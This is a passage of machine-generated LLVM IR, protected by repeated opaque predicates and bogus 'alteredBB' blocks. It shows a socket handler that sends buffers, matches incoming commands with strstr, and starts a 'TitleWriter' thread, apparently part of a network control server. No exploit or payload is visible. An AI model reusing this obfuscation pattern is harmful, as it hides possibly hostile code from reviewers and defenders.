  %1279 = load i32, i32* @x.15
  %1280 = load i32, i32* @y.16
  %1281 = sub i32 %1279, 1
  %1282 = mul i32 %1279, %1281
  %1283 = urem i32 %1282, 2
  %1284 = icmp eq i32 %1283, 0
  %1285 = icmp slt i32 %1280, 10
  %1286 = or i1 %1284, %1285
  br i1 %1286, label %originalBBpart2178, label %originalBB176alteredBB

originalBBpart2178:                               ; preds = %originalBB176
  br label %1940

; <label>:1287:                                   ; preds = %1263
  %1288 = load i32, i32* @x.15
  %1289 = load i32, i32* @y.16
  %1290 = sub i32 %1288, 1
  %1291 = mul i32 %1288, %1290
  %1292 = urem i32 %1291, 2
  %1293 = icmp eq i32 %1292, 0
  %1294 = icmp slt i32 %1289, 10
  %1295 = or i1 %1293, %1294
  br i1 %1295, label %originalBB180, label %originalBB180alteredBB

originalBB180:                                    ; preds = %originalBB180alteredBB, %1287
  %1296 = load i32, i32* %4, align 4
  %1297 = getelementptr inbounds [80 x i8], [80 x i8]* %40, i32 0, i32 0
  %1298 = getelementptr inbounds [80 x i8], [80 x i8]* %40, i32 0, i32 0
  %1299 = call i64 @strlen(i8* %1298) #8
  %1300 = call i64 @send(i32 %1296, i8* %1297, i64 %1299, i32 16384)
  %1301 = icmp eq i64 %1300, -1
  %1302 = load i32, i32* @x.15
  %1303 = load i32, i32* @y.16
  %1304 = sub i32 %1302, 1
  %1305 = mul i32 %1302, %1304
  %1306 = urem i32 %1305, 2
  %1307 = icmp eq i32 %1306, 0
  %1308 = icmp slt i32 %1303, 10
  %1309 = or i1 %1307, %1308
  br i1 %1309, label %originalBBpart2182, label %originalBB180alteredBB

originalBBpart2182:                               ; preds = %originalBB180
  br i1 %1301, label %1310, label %1311

; <label>:1310:                                   ; preds = %originalBBpart2182
  br label %1940

; <label>:1311:                                   ; preds = %originalBBpart2182
  %1312 = load i32, i32* %4, align 4
  %1313 = getelementptr inbounds [80 x i8], [80 x i8]* %41, i32 0, i32 0
  %1314 = getelementptr inbounds [80 x i8], [80 x i8]* %41, i32 0, i32 0
  %1315 = call i64 @strlen(i8* %1314) #8
  %1316 = call i64 @send(i32 %1312, i8* %1313, i64 %1315, i32 16384)
  %1317 = icmp eq i64 %1316, -1
  br i1 %1317, label %1318, label %1319

; <label>:1318:                                   ; preds = %1311
  br label %1940

; <label>:1319:                                   ; preds = %1311
  %1320 = load i32, i32* %4, align 4
  %1321 = getelementptr inbounds [80 x i8], [80 x i8]* %42, i32 0, i32 0
  %1322 = getelementptr inbounds [80 x i8], [80 x i8]* %42, i32 0, i32 0
  %1323 = call i64 @strlen(i8* %1322) #8
  %1324 = call i64 @send(i32 %1320, i8* %1321, i64 %1323, i32 16384)
  %1325 = icmp eq i64 %1324, -1
  br i1 %1325, label %1326, label %1327

; <label>:1326:                                   ; preds = %1319
  br label %1940

; <label>:1327:                                   ; preds = %1319
  %1328 = load i32, i32* %4, align 4
  %1329 = getelementptr inbounds [80 x i8], [80 x i8]* %43, i32 0, i32 0
  %1330 = getelementptr inbounds [80 x i8], [80 x i8]* %43, i32 0, i32 0
  %1331 = call i64 @strlen(i8* %1330) #8
  %1332 = call i64 @send(i32 %1328, i8* %1329, i64 %1331, i32 16384)
  %1333 = icmp eq i64 %1332, -1
  br i1 %1333, label %1334, label %1335

; <label>:1334:                                   ; preds = %1327
  br label %1940

; <label>:1335:                                   ; preds = %1327
  %1336 = load i32, i32* %4, align 4
  %1337 = getelementptr inbounds [80 x i8], [80 x i8]* %44, i32 0, i32 0
  %1338 = getelementptr inbounds [80 x i8], [80 x i8]* %44, i32 0, i32 0
  %1339 = call i64 @strlen(i8* %1338) #8
  %1340 = call i64 @send(i32 %1336, i8* %1337, i64 %1339, i32 16384)
  %1341 = icmp eq i64 %1340, -1
  br i1 %1341, label %1342, label %1343

; <label>:1342:                                   ; preds = %1335
  br label %1940

; <label>:1343:                                   ; preds = %1335
  %1344 = load i32, i32* %4, align 4
  %1345 = getelementptr inbounds [80 x i8], [80 x i8]* %45, i32 0, i32 0
  %1346 = getelementptr inbounds [80 x i8], [80 x i8]* %45, i32 0, i32 0
  %1347 = call i64 @strlen(i8* %1346) #8
  %1348 = call i64 @send(i32 %1344, i8* %1345, i64 %1347, i32 16384)
  %1349 = icmp eq i64 %1348, -1
  br i1 %1349, label %1350, label %1351

; <label>:1350:                                   ; preds = %1343
  br label %1940

; <label>:1351:                                   ; preds = %1343
  %1352 = load i32, i32* @x.15
  %1353 = load i32, i32* @y.16
  %1354 = sub i32 %1352, 1
  %1355 = mul i32 %1352, %1354
  %1356 = urem i32 %1355, 2
  %1357 = icmp eq i32 %1356, 0
  %1358 = icmp slt i32 %1353, 10
  %1359 = or i1 %1357, %1358
  br i1 %1359, label %originalBB184, label %originalBB184alteredBB

originalBB184:                                    ; preds = %originalBB184alteredBB, %1351
  %1360 = load i32, i32* %4, align 4
  %1361 = getelementptr inbounds [80 x i8], [80 x i8]* %46, i32 0, i32 0
  %1362 = getelementptr inbounds [80 x i8], [80 x i8]* %46, i32 0, i32 0
  %1363 = call i64 @strlen(i8* %1362) #8
  %1364 = call i64 @send(i32 %1360, i8* %1361, i64 %1363, i32 16384)
  %1365 = icmp eq i64 %1364, -1
  %1366 = load i32, i32* @x.15
  %1367 = load i32, i32* @y.16
  %1368 = sub i32 %1366, 1
  %1369 = mul i32 %1366, %1368
  %1370 = urem i32 %1369, 2
  %1371 = icmp eq i32 %1370, 0
  %1372 = icmp slt i32 %1367, 10
  %1373 = or i1 %1371, %1372
  br i1 %1373, label %originalBBpart2186, label %originalBB184alteredBB

originalBBpart2186:                               ; preds = %originalBB184
  br i1 %1365, label %1374, label %1375

; <label>:1374:                                   ; preds = %originalBBpart2186
  br label %1940

; <label>:1375:                                   ; preds = %originalBBpart2186
  %1376 = load i32, i32* %4, align 4
  %1377 = getelementptr inbounds [80 x i8], [80 x i8]* %47, i32 0, i32 0
  %1378 = getelementptr inbounds [80 x i8], [80 x i8]* %47, i32 0, i32 0
  %1379 = call i64 @strlen(i8* %1378) #8
  %1380 = call i64 @send(i32 %1376, i8* %1377, i64 %1379, i32 16384)
  %1381 = icmp eq i64 %1380, -1
  br i1 %1381, label %1382, label %1383

; <label>:1382:                                   ; preds = %1375
  br label %1940

; <label>:1383:                                   ; preds = %1375
  %1384 = load i32, i32* @x.15
  %1385 = load i32, i32* @y.16
  %1386 = sub i32 %1384, 1
  %1387 = mul i32 %1384, %1386
  %1388 = urem i32 %1387, 2
  %1389 = icmp eq i32 %1388, 0
  %1390 = icmp slt i32 %1385, 10
  %1391 = or i1 %1389, %1390
  br i1 %1391, label %originalBB188, label %originalBB188alteredBB

originalBB188:                                    ; preds = %originalBB188alteredBB, %1383
  %1392 = load i32, i32* %4, align 4
  %1393 = getelementptr inbounds [80 x i8], [80 x i8]* %48, i32 0, i32 0
  %1394 = getelementptr inbounds [80 x i8], [80 x i8]* %48, i32 0, i32 0
  %1395 = call i64 @strlen(i8* %1394) #8
  %1396 = call i64 @send(i32 %1392, i8* %1393, i64 %1395, i32 16384)
  %1397 = icmp eq i64 %1396, -1
  %1398 = load i32, i32* @x.15
  %1399 = load i32, i32* @y.16
  %1400 = sub i32 %1398, 1
  %1401 = mul i32 %1398, %1400
  %1402 = urem i32 %1401, 2
  %1403 = icmp eq i32 %1402, 0
  %1404 = icmp slt i32 %1399, 10
  %1405 = or i1 %1403, %1404
  br i1 %1405, label %originalBBpart2190, label %originalBB188alteredBB

originalBBpart2190:                               ; preds = %originalBB188
  br i1 %1397, label %1406, label %1407

; <label>:1406:                                   ; preds = %originalBBpart2190
  br label %1940

; <label>:1407:                                   ; preds = %originalBBpart2190
  %1408 = load i32, i32* %4, align 4
  %1409 = getelementptr inbounds [80 x i8], [80 x i8]* %49, i32 0, i32 0
  %1410 = getelementptr inbounds [80 x i8], [80 x i8]* %49, i32 0, i32 0
  %1411 = call i64 @strlen(i8* %1410) #8
  %1412 = call i64 @send(i32 %1408, i8* %1409, i64 %1411, i32 16384)
  %1413 = icmp eq i64 %1412, -1
  br i1 %1413, label %1414, label %1431

; <label>:1414:                                   ; preds = %1407
  %1415 = load i32, i32* @x.15
  %1416 = load i32, i32* @y.16
  %1417 = sub i32 %1415, 1
  %1418 = mul i32 %1415, %1417
  %1419 = urem i32 %1418, 2
  %1420 = icmp eq i32 %1419, 0
  %1421 = icmp slt i32 %1416, 10
  %1422 = or i1 %1420, %1421
  br i1 %1422, label %originalBB192, label %originalBB192alteredBB

originalBB192:                                    ; preds = %originalBB192alteredBB, %1414
  %1423 = load i32, i32* @x.15
  %1424 = load i32, i32* @y.16
  %1425 = sub i32 %1423, 1
  %1426 = mul i32 %1423, %1425
  %1427 = urem i32 %1426, 2
  %1428 = icmp eq i32 %1427, 0
  %1429 = icmp slt i32 %1424, 10
  %1430 = or i1 %1428, %1429
  br i1 %1430, label %originalBBpart2194, label %originalBB192alteredBB

originalBBpart2194:                               ; preds = %originalBB192
  br label %1940

; <label>:1431:                                   ; preds = %1407
  %1432 = load i32, i32* %4, align 4
  %1433 = getelementptr inbounds [80 x i8], [80 x i8]* %50, i32 0, i32 0
  %1434 = getelementptr inbounds [80 x i8], [80 x i8]* %50, i32 0, i32 0
  %1435 = call i64 @strlen(i8* %1434) #8
  %1436 = call i64 @send(i32 %1432, i8* %1433, i64 %1435, i32 16384)
  %1437 = icmp eq i64 %1436, -1
  br i1 %1437, label %1438, label %1439

; <label>:1438:                                   ; preds = %1431
  br label %1940

; <label>:1439:                                   ; preds = %1431
  %1440 = load i32, i32* @x.15
  %1441 = load i32, i32* @y.16
  %1442 = sub i32 %1440, 1
  %1443 = mul i32 %1440, %1442
  %1444 = urem i32 %1443, 2
  %1445 = icmp eq i32 %1444, 0
  %1446 = icmp slt i32 %1441, 10
  %1447 = or i1 %1445, %1446
  br i1 %1447, label %originalBB196, label %originalBB196alteredBB

originalBB196:                                    ; preds = %originalBB196alteredBB, %1439
  %1448 = load i32, i32* %4, align 4
  %1449 = getelementptr inbounds [80 x i8], [80 x i8]* %51, i32 0, i32 0
  %1450 = getelementptr inbounds [80 x i8], [80 x i8]* %51, i32 0, i32 0
  %1451 = call i64 @strlen(i8* %1450) #8
  %1452 = call i64 @send(i32 %1448, i8* %1449, i64 %1451, i32 16384)
  %1453 = icmp eq i64 %1452, -1
  %1454 = load i32, i32* @x.15
  %1455 = load i32, i32* @y.16
  %1456 = sub i32 %1454, 1
  %1457 = mul i32 %1454, %1456
  %1458 = urem i32 %1457, 2
  %1459 = icmp eq i32 %1458, 0
  %1460 = icmp slt i32 %1455, 10
  %1461 = or i1 %1459, %1460
  br i1 %1461, label %originalBBpart2198, label %originalBB196alteredBB

originalBBpart2198:                               ; preds = %originalBB196
  br i1 %1453, label %1462, label %1463

; <label>:1462:                                   ; preds = %originalBBpart2198
  br label %1940

; <label>:1463:                                   ; preds = %originalBBpart2198
  %1464 = load i32, i32* @x.15
  %1465 = load i32, i32* @y.16
  %1466 = sub i32 %1464, 1
  %1467 = mul i32 %1464, %1466
  %1468 = urem i32 %1467, 2
  %1469 = icmp eq i32 %1468, 0
  %1470 = icmp slt i32 %1465, 10
  %1471 = or i1 %1469, %1470
  br i1 %1471, label %originalBB200, label %originalBB200alteredBB

originalBB200:                                    ; preds = %originalBB200alteredBB, %1463
  %1472 = load i32, i32* %4, align 4
  %1473 = getelementptr inbounds [80 x i8], [80 x i8]* %52, i32 0, i32 0
  %1474 = getelementptr inbounds [80 x i8], [80 x i8]* %52, i32 0, i32 0
  %1475 = call i64 @strlen(i8* %1474) #8
  %1476 = call i64 @send(i32 %1472, i8* %1473, i64 %1475, i32 16384)
  %1477 = icmp eq i64 %1476, -1
  %1478 = load i32, i32* @x.15
  %1479 = load i32, i32* @y.16
  %1480 = sub i32 %1478, 1
  %1481 = mul i32 %1478, %1480
  %1482 = urem i32 %1481, 2
  %1483 = icmp eq i32 %1482, 0
  %1484 = icmp slt i32 %1479, 10
  %1485 = or i1 %1483, %1484
  br i1 %1485, label %originalBBpart2202, label %originalBB200alteredBB

originalBBpart2202:                               ; preds = %originalBB200
  br i1 %1477, label %1486, label %1487

; <label>:1486:                                   ; preds = %originalBBpart2202
  br label %1940

; <label>:1487:                                   ; preds = %originalBBpart2202
  %1488 = load i32, i32* @x.15
  %1489 = load i32, i32* @y.16
  %1490 = sub i32 %1488, 1
  %1491 = mul i32 %1488, %1490
  %1492 = urem i32 %1491, 2
  %1493 = icmp eq i32 %1492, 0
  %1494 = icmp slt i32 %1489, 10
  %1495 = or i1 %1493, %1494
  br i1 %1495, label %originalBB204, label %originalBB204alteredBB

originalBB204:                                    ; preds = %originalBB204alteredBB, %1487
  %1496 = load i8*, i8** %3, align 8
  %1497 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %1496) #7
  %1498 = load i32, i32* @x.15
  %1499 = load i32, i32* @y.16
  %1500 = sub i32 %1498, 1
  %1501 = mul i32 %1498, %1500
  %1502 = urem i32 %1501, 2
  %1503 = icmp eq i32 %1502, 0
  %1504 = icmp slt i32 %1499, 10
  %1505 = or i1 %1503, %1504
  br i1 %1505, label %originalBBpart2206, label %originalBB204alteredBB

originalBBpart2206:                               ; preds = %originalBB204
  br label %561

; <label>:1506:                                   ; preds = %1007
  %1507 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %1508 = call i8* @strstr(i8* %1507, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.97, i32 0, i32 0)) #8
  %1509 = icmp ne i8* %1508, null
  br i1 %1509, label %1510, label %1538

; <label>:1510:                                   ; preds = %1506
  %1511 = getelementptr inbounds [2048 x i8], [2048 x i8]* %53, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %1511, i8 0, i64 2048, i32 16, i1 false)
  %1512 = getelementptr inbounds [2048 x i8], [2048 x i8]* %53, i32 0, i32 0
  %1513 = call i32 (i8*, i8*, ...) @sprintf(i8* %1512, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.98, i32 0, i32 0)) #7
  %1514 = load i32, i32* %4, align 4
  %1515 = getelementptr inbounds [2048 x i8], [2048 x i8]* %53, i32 0, i32 0
  %1516 = getelementptr inbounds [2048 x i8], [2048 x i8]* %53, i32 0, i32 0
  %1517 = call i64 @strlen(i8* %1516) #8
  %1518 = call i64 @send(i32 %1514, i8* %1515, i64 %1517, i32 16384)
  %1519 = icmp eq i64 %1518, -1
  br i1 %1519, label %1520, label %1537

; <label>:1520:                                   ; preds = %1510
  %1521 = load i32, i32* @x.15
  %1522 = load i32, i32* @y.16
  %1523 = sub i32 %1521, 1
  %1524 = mul i32 %1521, %1523
  %1525 = urem i32 %1524, 2
  %1526 = icmp eq i32 %1525, 0
  %1527 = icmp slt i32 %1522, 10
  %1528 = or i1 %1526, %1527
  br i1 %1528, label %originalBB208, label %originalBB208alteredBB

originalBB208:                                    ; preds = %originalBB208alteredBB, %1520
  %1529 = load i32, i32* @x.15
  %1530 = load i32, i32* @y.16
  %1531 = sub i32 %1529, 1
  %1532 = mul i32 %1529, %1531
  %1533 = urem i32 %1532, 2
  %1534 = icmp eq i32 %1533, 0
  %1535 = icmp slt i32 %1530, 10
  %1536 = or i1 %1534, %1535
  br i1 %1536, label %originalBBpart2210, label %originalBB208alteredBB

originalBBpart2210:                               ; preds = %originalBB208
  br label %1940

; <label>:1537:                                   ; preds = %1510
  br label %561

; <label>:1538:                                   ; preds = %1506
  %1539 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %1540 = call i8* @strstr(i8* %1539, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.99, i32 0, i32 0)) #8
  %1541 = icmp ne i8* %1540, null
  br i1 %1541, label %1542, label %1793

; <label>:1542:                                   ; preds = %1538
  %1543 = load i32, i32* @x.15
  %1544 = load i32, i32* @y.16
  %1545 = sub i32 %1543, 1
  %1546 = mul i32 %1543, %1545
  %1547 = urem i32 %1546, 2
  %1548 = icmp eq i32 %1547, 0
  %1549 = icmp slt i32 %1544, 10
  %1550 = or i1 %1548, %1549
  br i1 %1550, label %originalBB212, label %originalBB212alteredBB

originalBB212:                                    ; preds = %originalBB212alteredBB, %1542
  %1551 = getelementptr inbounds [2048 x i8], [2048 x i8]* %54, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %1551, i8 0, i64 2048, i32 16, i1 false)
  %1552 = getelementptr inbounds [2048 x i8], [2048 x i8]* %54, i32 0, i32 0
  %1553 = call i32 (i8*, i8*, ...) @sprintf(i8* %1552, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.100, i32 0, i32 0)) #7
  %1554 = load i32, i32* %4, align 4
  %1555 = getelementptr inbounds [2048 x i8], [2048 x i8]* %54, i32 0, i32 0
  %1556 = getelementptr inbounds [2048 x i8], [2048 x i8]* %54, i32 0, i32 0
  %1557 = call i64 @strlen(i8* %1556) #8
  %1558 = call i64 @send(i32 %1554, i8* %1555, i64 %1557, i32 16384)
  %1559 = icmp eq i64 %1558, -1
  %1560 = load i32, i32* @x.15
  %1561 = load i32, i32* @y.16
  %1562 = sub i32 %1560, 1
  %1563 = mul i32 %1560, %1562
  %1564 = urem i32 %1563, 2
  %1565 = icmp eq i32 %1564, 0
  %1566 = icmp slt i32 %1561, 10
  %1567 = or i1 %1565, %1566
  br i1 %1567, label %originalBBpart2214, label %originalBB212alteredBB

originalBBpart2214:                               ; preds = %originalBB212
  br i1 %1559, label %1568, label %1585

; <label>:1568:                                   ; preds = %originalBBpart2214
  %1569 = load i32, i32* @x.15
  %1570 = load i32, i32* @y.16
  %1571 = sub i32 %1569, 1
  %1572 = mul i32 %1569, %1571
  %1573 = urem i32 %1572, 2
  %1574 = icmp eq i32 %1573, 0
  %1575 = icmp slt i32 %1570, 10
  %1576 = or i1 %1574, %1575
  br i1 %1576, label %originalBB216, label %originalBB216alteredBB

originalBB216:                                    ; preds = %originalBB216alteredBB, %1568
  %1577 = load i32, i32* @x.15
  %1578 = load i32, i32* @y.16
  %1579 = sub i32 %1577, 1
  %1580 = mul i32 %1577, %1579
  %1581 = urem i32 %1580, 2
  %1582 = icmp eq i32 %1581, 0
  %1583 = icmp slt i32 %1578, 10
  %1584 = or i1 %1582, %1583
  br i1 %1584, label %originalBBpart2218, label %originalBB216alteredBB

originalBBpart2218:                               ; preds = %originalBB216
  br label %1940

; <label>:1585:                                   ; preds = %originalBBpart2214
  %1586 = load i32, i32* %4, align 4
  %1587 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i32 0, i32 0
  %1588 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i32 0, i32 0
  %1589 = call i64 @strlen(i8* %1588) #8
  %1590 = call i64 @send(i32 %1586, i8* %1587, i64 %1589, i32 16384)
  %1591 = icmp eq i64 %1590, -1
  br i1 %1591, label %1592, label %1593

; <label>:1592:                                   ; preds = %1585
  br label %1940

; <label>:1593:                                   ; preds = %1585
  %1594 = load i32, i32* %4, align 4
  %1595 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i32 0, i32 0
  %1596 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i32 0, i32 0
  %1597 = call i64 @strlen(i8* %1596) #8
  %1598 = call i64 @send(i32 %1594, i8* %1595, i64 %1597, i32 16384)
  %1599 = icmp eq i64 %1598, -1
  br i1 %1599, label %1600, label %1617

; <label>:1600:                                   ; preds = %1593
  %1601 = load i32, i32* @x.15
  %1602 = load i32, i32* @y.16
  %1603 = sub i32 %1601, 1
  %1604 = mul i32 %1601, %1603
  %1605 = urem i32 %1604, 2
  %1606 = icmp eq i32 %1605, 0
  %1607 = icmp slt i32 %1602, 10
  %1608 = or i1 %1606, %1607
  br i1 %1608, label %originalBB220, label %originalBB220alteredBB

originalBB220:                                    ; preds = %originalBB220alteredBB, %1600
  %1609 = load i32, i32* @x.15
  %1610 = load i32, i32* @y.16
  %1611 = sub i32 %1609, 1
  %1612 = mul i32 %1609, %1611
  %1613 = urem i32 %1612, 2
  %1614 = icmp eq i32 %1613, 0
  %1615 = icmp slt i32 %1610, 10
  %1616 = or i1 %1614, %1615
  br i1 %1616, label %originalBBpart2222, label %originalBB220alteredBB

originalBBpart2222:                               ; preds = %originalBB220
  br label %1940

; <label>:1617:                                   ; preds = %1593
  %1618 = load i32, i32* %4, align 4
  %1619 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i32 0, i32 0
  %1620 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i32 0, i32 0
  %1621 = call i64 @strlen(i8* %1620) #8
  %1622 = call i64 @send(i32 %1618, i8* %1619, i64 %1621, i32 16384)
  %1623 = icmp eq i64 %1622, -1
  br i1 %1623, label %1624, label %1641

; <label>:1624:                                   ; preds = %1617
  %1625 = load i32, i32* @x.15
  %1626 = load i32, i32* @y.16
  %1627 = sub i32 %1625, 1
  %1628 = mul i32 %1625, %1627
  %1629 = urem i32 %1628, 2
  %1630 = icmp eq i32 %1629, 0
  %1631 = icmp slt i32 %1626, 10
  %1632 = or i1 %1630, %1631
  br i1 %1632, label %originalBB224, label %originalBB224alteredBB

originalBB224:                                    ; preds = %originalBB224alteredBB, %1624
  %1633 = load i32, i32* @x.15
  %1634 = load i32, i32* @y.16
  %1635 = sub i32 %1633, 1
  %1636 = mul i32 %1633, %1635
  %1637 = urem i32 %1636, 2
  %1638 = icmp eq i32 %1637, 0
  %1639 = icmp slt i32 %1634, 10
  %1640 = or i1 %1638, %1639
  br i1 %1640, label %originalBBpart2226, label %originalBB224alteredBB

originalBBpart2226:                               ; preds = %originalBB224
  br label %1940

; <label>:1641:                                   ; preds = %1617
  %1642 = load i32, i32* %4, align 4
  %1643 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i32 0, i32 0
  %1644 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i32 0, i32 0
  %1645 = call i64 @strlen(i8* %1644) #8
  %1646 = call i64 @send(i32 %1642, i8* %1643, i64 %1645, i32 16384)
  %1647 = icmp eq i64 %1646, -1
  br i1 %1647, label %1648, label %1665

; <label>:1648:                                   ; preds = %1641
  %1649 = load i32, i32* @x.15
  %1650 = load i32, i32* @y.16
  %1651 = sub i32 %1649, 1
  %1652 = mul i32 %1649, %1651
  %1653 = urem i32 %1652, 2
  %1654 = icmp eq i32 %1653, 0
  %1655 = icmp slt i32 %1650, 10
  %1656 = or i1 %1654, %1655
  br i1 %1656, label %originalBB228, label %originalBB228alteredBB

originalBB228:                                    ; preds = %originalBB228alteredBB, %1648
  %1657 = load i32, i32* @x.15
  %1658 = load i32, i32* @y.16
  %1659 = sub i32 %1657, 1
  %1660 = mul i32 %1657, %1659
  %1661 = urem i32 %1660, 2
  %1662 = icmp eq i32 %1661, 0
  %1663 = icmp slt i32 %1658, 10
  %1664 = or i1 %1662, %1663
  br i1 %1664, label %originalBBpart2230, label %originalBB228alteredBB

originalBBpart2230:                               ; preds = %originalBB228
  br label %1940

; <label>:1665:                                   ; preds = %1641
  %1666 = load i32, i32* @x.15
  %1667 = load i32, i32* @y.16
  %1668 = sub i32 %1666, 1
  %1669 = mul i32 %1666, %1668
  %1670 = urem i32 %1669, 2
  %1671 = icmp eq i32 %1670, 0
  %1672 = icmp slt i32 %1667, 10
  %1673 = or i1 %1671, %1672
  br i1 %1673, label %originalBB232, label %originalBB232alteredBB

originalBB232:                                    ; preds = %originalBB232alteredBB, %1665
  %1674 = load i32, i32* %4, align 4
  %1675 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i32 0, i32 0
  %1676 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i32 0, i32 0
  %1677 = call i64 @strlen(i8* %1676) #8
  %1678 = call i64 @send(i32 %1674, i8* %1675, i64 %1677, i32 16384)
  %1679 = icmp eq i64 %1678, -1
  %1680 = load i32, i32* @x.15
  %1681 = load i32, i32* @y.16
  %1682 = sub i32 %1680, 1
  %1683 = mul i32 %1680, %1682
  %1684 = urem i32 %1683, 2
  %1685 = icmp eq i32 %1684, 0
  %1686 = icmp slt i32 %1681, 10
  %1687 = or i1 %1685, %1686
  br i1 %1687, label %originalBBpart2234, label %originalBB232alteredBB

originalBBpart2234:                               ; preds = %originalBB232
  br i1 %1679, label %1688, label %1689

; <label>:1688:                                   ; preds = %originalBBpart2234
  br label %1940

; <label>:1689:                                   ; preds = %originalBBpart2234
  %1690 = load i32, i32* %4, align 4
  %1691 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i32 0, i32 0
  %1692 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i32 0, i32 0
  %1693 = call i64 @strlen(i8* %1692) #8
  %1694 = call i64 @send(i32 %1690, i8* %1691, i64 %1693, i32 16384)
  %1695 = icmp eq i64 %1694, -1
  br i1 %1695, label %1696, label %1697

; <label>:1696:                                   ; preds = %1689
  br label %1940

; <label>:1697:                                   ; preds = %1689
  %1698 = load i32, i32* %4, align 4
  %1699 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %1700 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %1701 = call i64 @strlen(i8* %1700) #8
  %1702 = call i64 @send(i32 %1698, i8* %1699, i64 %1701, i32 16384)
  %1703 = icmp eq i64 %1702, -1
  br i1 %1703, label %1704, label %1705

; <label>:1704:                                   ; preds = %1697
  br label %1940

; <label>:1705:                                   ; preds = %1697
  %1706 = load i32, i32* @x.15
  %1707 = load i32, i32* @y.16
  %1708 = sub i32 %1706, 1
  %1709 = mul i32 %1706, %1708
  %1710 = urem i32 %1709, 2
  %1711 = icmp eq i32 %1710, 0
  %1712 = icmp slt i32 %1707, 10
  %1713 = or i1 %1711, %1712
  br i1 %1713, label %originalBB236, label %originalBB236alteredBB

originalBB236:                                    ; preds = %originalBB236alteredBB, %1705
  %1714 = load i32, i32* %4, align 4
  %1715 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i32 0, i32 0
  %1716 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i32 0, i32 0
  %1717 = call i64 @strlen(i8* %1716) #8
  %1718 = call i64 @send(i32 %1714, i8* %1715, i64 %1717, i32 16384)
  %1719 = icmp eq i64 %1718, -1
  %1720 = load i32, i32* @x.15
  %1721 = load i32, i32* @y.16
  %1722 = sub i32 %1720, 1
  %1723 = mul i32 %1720, %1722
  %1724 = urem i32 %1723, 2
  %1725 = icmp eq i32 %1724, 0
  %1726 = icmp slt i32 %1721, 10
  %1727 = or i1 %1725, %1726
  br i1 %1727, label %originalBBpart2238, label %originalBB236alteredBB

originalBBpart2238:                               ; preds = %originalBB236
  br i1 %1719, label %1728, label %1745

; <label>:1728:                                   ; preds = %originalBBpart2238
  %1729 = load i32, i32* @x.15
  %1730 = load i32, i32* @y.16
  %1731 = sub i32 %1729, 1
  %1732 = mul i32 %1729, %1731
  %1733 = urem i32 %1732, 2
  %1734 = icmp eq i32 %1733, 0
  %1735 = icmp slt i32 %1730, 10
  %1736 = or i1 %1734, %1735
  br i1 %1736, label %originalBB240, label %originalBB240alteredBB

originalBB240:                                    ; preds = %originalBB240alteredBB, %1728
  %1737 = load i32, i32* @x.15
  %1738 = load i32, i32* @y.16
  %1739 = sub i32 %1737, 1
  %1740 = mul i32 %1737, %1739
  %1741 = urem i32 %1740, 2
  %1742 = icmp eq i32 %1741, 0
  %1743 = icmp slt i32 %1738, 10
  %1744 = or i1 %1742, %1743
  br i1 %1744, label %originalBBpart2242, label %originalBB240alteredBB

originalBBpart2242:                               ; preds = %originalBB240
  br label %1940

; <label>:1745:                                   ; preds = %originalBBpart2238
  br label %1746

; <label>:1746:                                   ; preds = %1745
  %1747 = load i32, i32* %4, align 4
  %1748 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i32 0, i32 0
  %1749 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i32 0, i32 0
  %1750 = call i64 @strlen(i8* %1749) #8
  %1751 = call i64 @send(i32 %1747, i8* %1748, i64 %1750, i32 16384)
  %1752 = icmp eq i64 %1751, -1
  br i1 %1752, label %1753, label %1770

; <label>:1753:                                   ; preds = %1746
  %1754 = load i32, i32* @x.15
  %1755 = load i32, i32* @y.16
  %1756 = sub i32 %1754, 1
  %1757 = mul i32 %1754, %1756
  %1758 = urem i32 %1757, 2
  %1759 = icmp eq i32 %1758, 0
  %1760 = icmp slt i32 %1755, 10
  %1761 = or i1 %1759, %1760
  br i1 %1761, label %originalBB244, label %originalBB244alteredBB

originalBB244:                                    ; preds = %originalBB244alteredBB, %1753
  %1762 = load i32, i32* @x.15
  %1763 = load i32, i32* @y.16
  %1764 = sub i32 %1762, 1
  %1765 = mul i32 %1762, %1764
  %1766 = urem i32 %1765, 2
  %1767 = icmp eq i32 %1766, 0
  %1768 = icmp slt i32 %1763, 10
  %1769 = or i1 %1767, %1768
  br i1 %1769, label %originalBBpart2246, label %originalBB244alteredBB

originalBBpart2246:                               ; preds = %originalBB244
  br label %1940

; <label>:1770:                                   ; preds = %1746
  %1771 = load i32, i32* %4, align 4
  %1772 = call i64 @send(i32 %1771, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.35, i32 0, i32 0), i64 12, i32 16384)
  %1773 = icmp eq i64 %1772, -1
  br i1 %1773, label %1774, label %1775

; <label>:1774:                                   ; preds = %1770
  br label %1940

; <label>:1775:                                   ; preds = %1770
  %1776 = load i32, i32* @x.15
  %1777 = load i32, i32* @y.16
  %1778 = sub i32 %1776, 1
  %1779 = mul i32 %1776, %1778
  %1780 = urem i32 %1779, 2
  %1781 = icmp eq i32 %1780, 0
  %1782 = icmp slt i32 %1777, 10
  %1783 = or i1 %1781, %1782
